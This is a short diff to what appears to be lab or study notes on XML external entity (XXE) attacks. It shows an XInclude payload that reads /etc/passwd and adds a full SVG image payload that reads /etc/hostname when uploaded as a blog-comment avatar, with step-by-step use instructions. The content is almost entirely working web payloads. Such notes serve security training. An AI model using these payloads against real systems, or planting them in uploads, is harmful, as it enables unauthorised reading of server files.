@@ -12,3 +12,11 @@ Exploiting XXE to perform SSRF attacks:
 Exploiting XInclude to retrieve files:
 
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+Exploiting XXE via image file upload:
+
+1) Create a local SVG image with the following content:
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+2) Post a comment on a blog post, and upload this image as an avatar.
+3) When you view your comment, you should see the contents of the /etc/hostname file in your image.
+
